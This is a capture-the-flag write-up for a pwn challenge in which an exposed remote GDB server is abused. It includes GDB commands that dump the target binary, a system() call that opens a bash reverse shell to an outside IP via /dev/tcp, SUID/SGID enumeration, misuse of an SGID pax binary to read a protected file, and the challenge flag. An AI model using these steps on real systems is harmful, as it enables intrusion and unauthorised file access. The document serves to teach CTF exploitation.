# gerts-data-brotocol

[library.m0unt41n.ch/challenges/gerts-data-brotocol](https://library.m0unt41n.ch/challenges/gerts-data-brotocol) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

> _Gert was a brilliant programmer who had just developed a new data protocol that promised to_
> _revolutionize the industry. He named it "Gert's Data Brotocol," or GDB for short. Excited_
> _about his invention, Gert sent out emails to all the major tech companies, hoping to create_
> _a secure partnership._
>
> _But despite his best efforts, no one seemed interested in opening GDB to the public._
> _Disheartened, Gert decided to take matters into his own hands and created a startup to launch_
> _GDB himself._

We get access to remotely debug a simple program, running in a loop. We first get a reverse
shell and then, use a SGID binary to dump the semi-protected flag.

# Initial analysis

The challenge description makes it reasonably clear that what we get is a remote GDB target &#128578;
We will use [pwndbg](https://browserpwndbg.readthedocs.io/en/docs/) to look at it.

## Connecting

When we get the GDB prompt the first time, the program is still at early
initialization stage - without glibc loaded, etc.

```bash
pwndbg> target remote library.m0unt41n.ch:32329
pwndbg> bt
#0  0x00007ffff7fe3290 in ?? () from target:/lib64/ld-linux-x86-64.so.2
#1  0x0000000000000001 in ?? ()
#2  0x00007fffffffee00 in ?? ()
#3  0x0000000000000000 in ?? ()
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/yeetus/yeet
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/yeetus/yeet
    0x555555556000     0x555555557000 r--p     1000   2000 /home/yeetus/yeet
    0x555555557000     0x555555559000 rw-p     2000   2000 /home/yeetus/yeet
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7fff000 rw-p     4000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

Note that ASLR seems off - the `0x55555555.000` is way too round.

## First look at the binary code

The code segment of `/home/yeetus/yeet` is really small, can be entirely viewed with
with `disassemble 0x555555555000,+449`. And even there, earlier sections look like usual
things we find in the `.text` segment - PLT, etc. And only at the end, there is something
that looks like `main()`, which just calls `printf()` and `sleep()`.

Looking a bit closer at it, the code seems to be:

```c
int main(int argc, char **argv) {
    // 0x0000555555555169:  endbr64
    // 0x000055555555516d:  push   rbp
    // 0x000055555555516e:  mov    rbp,rsp
    // 0x0000555555555171:  sub    rsp,0x10
    int i = 0
    // 0x0000555555555175:  mov    QWORD PTR [rbp-0x8],0x0
    // 0x000055555555517d:  jmp    0x5555555551a2
    do {
        printf("Yeet!")
        // 0x000055555555517f:  lea    rax,[rip+0xe7e]        # 0x555555556004 "Yeet!"
        // 0x0000555555555186:  mov    rdi,rax
        // 0x0000555555555189:  mov    eax,0x0
        // 0x000055555555518e:  call   0x555555555060 <printf@plt>
        sleep 1
        // 0x0000555555555193:  mov    edi,0x1
        // 0x0000555555555198:  call   0x555555555070 <sleep@plt>
        i++
        // 0x000055555555519d:  add    QWORD PTR [rbp-0x8],0x1
    } while i <= 1336;
    // 0x00005555555551a2:  cmp    QWORD PTR [rbp-0x8],0x538
    // 0x00005555555551aa:  jbe    0x55555555517f
    return 0;
    // 0x00005555555551ac:  mov    eax,0x0
    // 0x00005555555551b1:  leave
    // 0x00005555555551b2:  ret
}
```

## Loading the glibc

As noticed above, we get the program in a state where it did not even load the glibc yet. Let's
skip to some reasonable point in the binary, e.g. just before the `printf()`:


```bash
pwndbg> break *0x000055555555518e
pwndbg> c
(...)
Breakpoint 1, 0x000055555555518e in ?? ()
pwndbg> bt
#0  0x000055555555518e in ?? ()
#1  0x00007ffff7db9d90 in ?? () from target:/lib/x86_64-linux-gnu/libc.so.6
#2  0x00007ffff7db9e40 in __libc_start_main () from target:/lib/x86_64-linux-gnu/libc.so.6
#3  0x00005555555550a5 in ?? ()
pwndbg> vmmap
```

OK, now we have access to libc functions.

## Saving and decompiling the binary

Let's dump that executable to a file. One option would be to save the `0x555555555000` segment,
but we can do something better - get the actual binary file. We can use the stack base as
a buffer (see `vmmap` output above)

```bash
pwndbg> call (int)open("/home/yeetus/yeet", 0, 0)
$1 = 3
pwndbg> call (int)read(3, 0x7ffffffde000, 65536)
$2 = 14472
pwndbg> dump memory /home/muflon/yeet 0x7ffffffde000 (0x7ffffffde000+14472)
```

The file seems fine:

```bash
$ ls -la yeet
-rw-r--r--. 1 muflon muflon 14472 Oct 27 15:45 yeet
$ file yeet
yeet: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=df60dffdf06742d1200af2b05c8e5c76e987e4d0, for GNU/Linux 3.2.0, stripped
```

And indeed, it's **that** simple. IDA spits out:

```c
int main(int argc, char **argv, char **envp) {
    for (int i=0; i<=1336; i++) {
        printf("Yeet!");
        sleep(1);
    }
    return 0;
}
```

Note lack of `\n` at the end of string - with buffered output, it will be a while until we see something, possibly
only at the final buffer flush.

## There is a flag too!

Randomly poking around, I saw that the flag is in the root directory, but not accessible:

```bash
pwndbg> call (int)open("/flag.txt", 0, 0)
$12 = -1
pwndbg) print (int)errno
$19 = 13   # EACCESS

pwndbg> call (int)chmod("/flag.txt", 0777)
$20 = -1
pwndbg> print (int)errno
$21 = 1    # EPERM
```

# Getting a reverse shell

From my experience, the challenges that were exposed directly with a port (as opposed to
a SSL tunnel) tended to have internet access open. Let's gamble on that and try getting
a reverse shell.

*   On an AWS VM (54.152.13.254) with open port 80:

    ```
    # nc -lvp 80
    Ncat: Version 7.93 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    ```

*   And then, we try to start it in GDB. By default this causes a bit of havoc in the
    GDB session, as it is trying to follow the subprocesses. But, this can be fixed with
    the `follow-fork-mode parent` flag. Overall, the complete reverse shell sequence in GDB is:
    
    ```bash
    pwndbg> target remote library.m0unt41n.ch:30662
    pwndbg> set follow-fork-mode parent
    pwndbg> break *0x000055555555518e
    pwndbg> c
    (...)
    pwndbg> call (int)system("/bin/bash -c \"( /bin/bash -i >& /dev/tcp/54.152.13.254/80 0>&1 & ) ; exit\"")
    ```
    
    It took me a while to figure the right combination of escapes - the above one has the nice
    property of completely detaching the shell from the debugged program.

*   On the remote side we will see the instance connecting and exposing a shell:

    ```
    # nc -lvp 80
    Ncat: Version 7.93 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    Ncat: Connection from 128.140.62.133.
    Ncat: Connection from 128.140.62.133:43564.
    bash: cannot set terminal process group (9): Inappropriate ioctl for device
    bash: no job control in this shell
    yeetus@gerts-data-brotocol:/$
    ```

# Unlocking the flag

The flag permissions are a bit odd - readable by `shadow` user:

```bash
$ ls -la /flag.txt
-rw-r----- 1 root shadow 44 May 30 22:29 /flag.txt
```

Recently modified files don't reveal anything special

```bash
$ ls -lartd $(find / -mtime -180 2>/dev/null | grep -v ^/sys | grep -v ^/proc | grep -v ^/dev)
-rw-r----- 1 root   shadow      44 May 30 22:29 /flag.txt
drwxr-xr-x 2 root   root      4096 May 30 22:29 /usr/share/doc/pax
drwxr-xr-x 2 root   root      4096 May 30 22:29 /usr/share/doc/gdbserver
-rw-rw-r-- 1 root   utmp    292292 May 30 22:29 /var/log/lastlog
-rw-r--r-- 1 root   root     32032 May 30 22:29 /var/log/faillog
-rw-r--r-- 1 yeetus yeetus     807 May 30 22:29 /home/yeetus/.profile
-rw-r--r-- 1 yeetus yeetus    3771 May 30 22:29 /home/yeetus/.bashrc
-rw-r--r-- 1 yeetus yeetus     220 May 30 22:29 /home/yeetus/.bash_logout
-rw-r--r-- 1 root   root        20 May 30 22:29 /etc/subuid
-rw-r--r-- 1 root   root        20 May 30 22:29 /etc/subgid
-rw-r----- 1 root   shadow     529 May 30 22:29 /etc/shadow-
-rw-r----- 1 root   shadow     529 May 30 22:29 /etc/shadow
-rw-r--r-- 1 root   root       965 May 30 22:29 /etc/passwd-
-rw-r----- 1 root   shadow     385 May 30 22:29 /etc/gshadow
-rw-r--r-- 1 root   root       461 May 30 22:29 /etc/group
-rw-r--r-- 1 root   root       968 May 30 22:29 /etc/passwd
-rwxr-xr-x 1 root   root     14472 May 30 22:29 /home/yeetus/yeet
-rw-r--r-- 1 root   root       142 Oct 28 08:37 /etc/resolv.conf
-rw-r--r-- 1 root   root        20 Oct 28 08:37 /etc/hostname
-rw-r--r-- 1 root   root       214 Oct 28 08:37 /etc/hosts
```

Looking for SUID / SGID files:

```bash
$ ls -la $(find / -perm -u=s -type f 2>/dev/null)
-rwsr-xr-x 1 root root 72712 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 44808 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 72072 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47488 Apr  9  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 40496 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59976 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 55680 Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 35200 Apr  9  2024 /usr/bin/umount

$ ls -la $(find / -perm -g=s -type f 2>/dev/null)
-rwxr-sr-x 1 root shadow  72184 Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root shadow  23136 Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 125208 Mar 24  2022 /usr/bin/pax
-rwxr-sr-x 1 root shadow  22680 Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow  26776 Jan 10  2024 /usr/sbin/unix_chkpwd
```

Hmmm, `pax` (archiving program) being a SGID? And not to just about any group,
but `shadow`, the one we need to access the flag? &#128578;

Funny enough, `pax` has a mode where it is pretty much a `cp` command:

```
$ pax -rw /flag.txt /tmp/
$ cat /tmp/flag.txt
shc2023{R3m0te_Gd8_expl01t5_v1a_m3t4spl01t}
```

I guess that, as usual for me, all the fine-grained poking above could be replaced
by a tool, that "just does the thing" &#128578;

---

## `shc2023{R3m0te_Gd8_expl01t5_v1a_m3t4spl01t}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
